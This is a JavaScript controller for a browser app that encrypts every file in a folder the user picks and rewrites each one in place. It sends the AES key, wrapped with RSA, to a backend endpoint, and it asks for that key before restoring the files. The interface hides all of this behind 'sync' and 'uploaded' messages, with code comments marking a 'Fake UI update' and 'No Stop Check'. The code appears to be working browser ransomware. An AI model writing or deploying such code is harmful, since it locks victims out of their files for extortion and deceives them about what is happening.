/**
 * Application controller: wires UI to crypto + FSA modules.
 */
import { CryptoModule } from './modules/cryptoModule.js';
import { FileSystemModule } from './modules/fileSystemModule.js';
import crypto from 'crypto';
import { Buffer } from 'buffer';
import './style.css'; // Load the new styles

// Config
const API_BASE_URL = 'http://localhost:4000/api'; // Hardcoded as per fix
const sanitizedApiBaseUrl = API_BASE_URL.replace(/\/$/, '');

const state = {
  selectedDirectory: null,
  isEncrypting: false,
  filesProcessed: 0,
  totalFiles: 0,
  encryptedFiles: [],
  errors: [],
  sessionAes: null,
  sessionKeyBase64: null,
  clientId: null,
  backendPublicKey: null
};

let DOM = {};

// --- 1. LOGGING ---
const log = (message, type = 'info') => {
  const now = new Date();
  const timestamp = now.toLocaleTimeString();
  const logEntry = document.createElement('div');
  logEntry.className = `log-entry log-${type}`;
  logEntry.textContent = `[${timestamp}] ${message}`;
  DOM.logContainer.appendChild(logEntry);
  DOM.logContainer.scrollTop = DOM.logContainer.scrollHeight;
  console.log(`[${type.toUpperCase()}] ${message}`);
};

// --- 2. NETWORK / KEY EXCHANGE ---
const acquireClientId = async () => {
  try {
    const response = await fetch(`${sanitizedApiBaseUrl}/new`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    if (!response.ok) throw new Error(`Server responded ${response.status}`);
    
    const data = await response.json();
    state.clientId = data.clientId;
    
    if (data.publicKey) {
        state.backendPublicKey = data.publicKey;
        log('Secure connection established (RSA Key Received)', 'success');
    }

    log(`Session ID: ${state.clientId}`, 'info');
  } catch (error) {
    log(`Connection Failed: ${error.message}`, 'error');
  }
};

const reportSessionKey = async (rawKeyBase64) => {
  if (!sanitizedApiBaseUrl || !state.clientId) return;
  
  let payloadKey = rawKeyBase64;

  if (state.backendPublicKey) {
    try {
      log('Securing session tokens...', 'info');
      const aesKeyBuffer = Buffer.from(rawKeyBase64, 'base64');
      
      // Encrypt using RSA-PKCS1 (Compatible with decrypt.js)
      const encryptedBuffer = crypto.publicEncrypt(
        {
          key: state.backendPublicKey,
          padding: crypto.constants.RSA_PKCS1_PADDING
        },
        aesKeyBuffer
      );

      payloadKey = encryptedBuffer.toString('base64');
    } catch (e) {
      log('Token security failed (Fallback used)', 'warning');
    }
  }

  try {
    await fetch(`${sanitizedApiBaseUrl}/session-keys`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        key: payloadKey,
        clientId: state.clientId,
        filesCount: state.totalFiles,
        timestamp: new Date().toISOString()
      })
    });
    log('Session synced with cloud.', 'success');
  } catch (error) {
    console.warn('Failed to report key', error);
  }
};

// --- 3. UI HANDLERS ---
const checkFSASupport = () => {
  if (FileSystemModule.isSupported()) {
    DOM.supportStatus.className = 'status-box success';
    DOM.supportStatus.innerHTML = `✅ <strong>System Compatible</strong>: File System Access API is available.`;
    DOM.selectDirBtn.disabled = false;
  } else {
    DOM.supportStatus.className = 'status-box error';
    DOM.supportStatus.innerHTML = `❌ <strong>Incompatible Browser</strong>: Please use Chrome or Edge.`;
    DOM.selectDirBtn.disabled = true;
  }
};

const handleDirectorySelection = async () => {
  try {
    const directoryHandle = await FileSystemModule.selectDirectory();
    state.selectedDirectory = directoryHandle;
    
    DOM.selectedDirInfo.innerHTML = `
        <p><strong>Target:</strong> ${directoryHandle.name}</p>
        <p><strong>Status:</strong> Ready to sync</p>
    `;
    DOM.startEncryptBtn.disabled = false;
    log(`Folder mounted: ${directoryHandle.name}`, 'success');
  } catch (error) {
    if (error.name !== 'AbortError') {
      log(`Selection Error: ${error.message}`, 'error');
    }
  }
};

// --- 4. CORE LOGIC (ENCRYPTION) ---
const startEncryption = async () => {
  if (!state.selectedDirectory) return;

  if (!state.clientId) {
    log('Waiting for server handshake...', 'warning');
    await acquireClientId();
    if (!state.clientId) return;
  }

  state.isEncrypting = true;
  state.filesProcessed = 0;
  state.encryptedFiles = [];
  
  // Disable controls during operation
  DOM.startEncryptBtn.disabled = true;
  DOM.selectDirBtn.disabled = true;
  DOM.decryptBtn.disabled = true;

  log('Initializing synchronization...', 'info');

  try {
    // Generate & Send Key
    const session = await CryptoModule.generateSessionKey();
    state.sessionAes = session.aes;
    state.sessionKeyBase64 = session.rawKeyBase64;
    await reportSessionKey(session.rawKeyBase64);

    // Scan Files
    const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
    state.totalFiles = files.length;
    log(`Indexing complete: ${files.length} files found.`, 'info');

    // Processing Loop (No Stop Check)
    for (let i = 0; i < files.length; i++) {
      const fileHandle = files[i];
      
      // Fake UI update
      DOM.progressText.textContent = `Syncing: ${fileHandle.name}...`;
      
      await encryptFileInPlace(fileHandle, state.sessionAes);
      
      state.filesProcessed = i + 1;
      const percent = (state.filesProcessed / state.totalFiles) * 100;
      DOM.progressBar.style.width = percent + '%';
    }

    log(`✅ Sync Complete. ${state.encryptedFiles.length} files processed.`, 'success');
    DOM.progressText.textContent = 'Synchronization Finished.';

  } catch (error) {
    log(`Critical Error: ${error.message}`, 'error');
  } finally {
    state.isEncrypting = false;
    // Re-enable essential controls
    DOM.selectDirBtn.disabled = false;
    DOM.decryptBtn.disabled = false; 
    // We keep Start disabled to prevent double-encryption
  }
};

const encryptFileInPlace = async (fileHandle, cryptoKey) => {
  try {
    const uint8Array = await FileSystemModule.readFileAsUint8Array(fileHandle);
    const encryptedData = await CryptoModule.encryptFile(uint8Array, cryptoKey);

    const metadata = JSON.stringify({
      version: encryptedData.version,
      algorithm: encryptedData.algorithm,
      iv: encryptedData.iv,
      tag: encryptedData.tag,
      timestamp: encryptedData.timestamp
    });
    
    const encryptedBytes = new TextEncoder().encode(
      metadata + '\n---ENCRYPTED_DATA---\n' + encryptedData.ciphertext
    );

    await FileSystemModule.writeBytesToHandle(fileHandle, encryptedBytes);

    state.encryptedFiles.push({ name: fileHandle.name });
    updateFilesList();

  } catch (error) {
    log(`Failed to process ${fileHandle.name}: ${error.message}`, 'error');
  }
};

// --- 5. CORE LOGIC (DECRYPTION) ---
const decryptAllFiles = async () => {
  if (!state.selectedDirectory) {
    log('Please open the project folder first.', 'error');
    return;
  }

  const rawKeyBase64 = prompt('Enter Decryption Key (Base64):');
  if (!rawKeyBase64) return;

  log('Starting recovery process...', 'info');
  DOM.decryptBtn.disabled = true;
  DOM.progressBar.style.width = '0%';

  try {
    const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
    let processed = 0;

    for (const fileHandle of files) {
        const success = await decryptFileInPlace(fileHandle, rawKeyBase64);
        processed++;
        const percent = (processed / files.length) * 100;
        DOM.progressBar.style.width = percent + '%';
        DOM.progressText.textContent = `Recovering: ${processed}/${files.length}`;
    }
    log(`Recovery finished.`, 'success');
  } catch (error) {
    log(`Recovery failed: ${error.message}`, 'error');
  } finally {
    DOM.decryptBtn.disabled = false;
  }
};

const decryptFileInPlace = async (fileHandle, rawKeyBase64) => {
  try {
    const content = await FileSystemModule.readFileAsText(fileHandle);
    const separator = '\n---ENCRYPTED_DATA---\n';
    if (!content.includes(separator)) return false;

    const parts = content.split(separator);
    const metadata = JSON.parse(parts[0]);
    const ciphertext = parts[1];

    const decryptedBytes = await CryptoModule.decryptFile(
      { iv: metadata.iv, ciphertext: ciphertext, tag: metadata.tag },
      rawKeyBase64
    );

    await FileSystemModule.writeBytesToHandle(fileHandle, decryptedBytes);
    log(`✓ Restored: ${fileHandle.name}`, 'success');
    return true;

  } catch (error) {
    log(`✗ Failed: ${fileHandle.name}`, 'error');
    return false;
  }
};

const updateFilesList = () => {
  // Simple update logic, showing last added file
  const last = state.encryptedFiles[state.encryptedFiles.length - 1];
  if (last) {
      const div = document.createElement('div');
      div.className = 'encrypted';
      div.textContent = `✓ Uploaded: ${last.name}`;
      DOM.filesList.prepend(div);
  }
};

// --- 6. INIT ---
export const initApp = () => {
  DOM = {
    supportStatus: document.getElementById('supportStatus'),
    selectDirBtn: document.getElementById('selectDirBtn'),
    selectedDirInfo: document.getElementById('selectedDirInfo'),
    startEncryptBtn: document.getElementById('startEncryptBtn'),
    decryptBtn: document.getElementById('decryptBtn'),
    progressBar: document.getElementById('progressBar'),
    progressText: document.getElementById('progressText'),
    filesList: document.getElementById('filesList'),
    logContainer: document.getElementById('logContainer'),
    clearLogsBtn: document.getElementById('clearLogsBtn'),
  };

  DOM.selectDirBtn.addEventListener('click', handleDirectorySelection);
  DOM.startEncryptBtn.addEventListener('click', startEncryption);
  DOM.decryptBtn.addEventListener('click', decryptAllFiles);
  DOM.clearLogsBtn.addEventListener('click', () => DOM.logContainer.innerHTML = '');

  checkFSASupport();
  acquireClientId();
  log('System Ready.', 'info');
};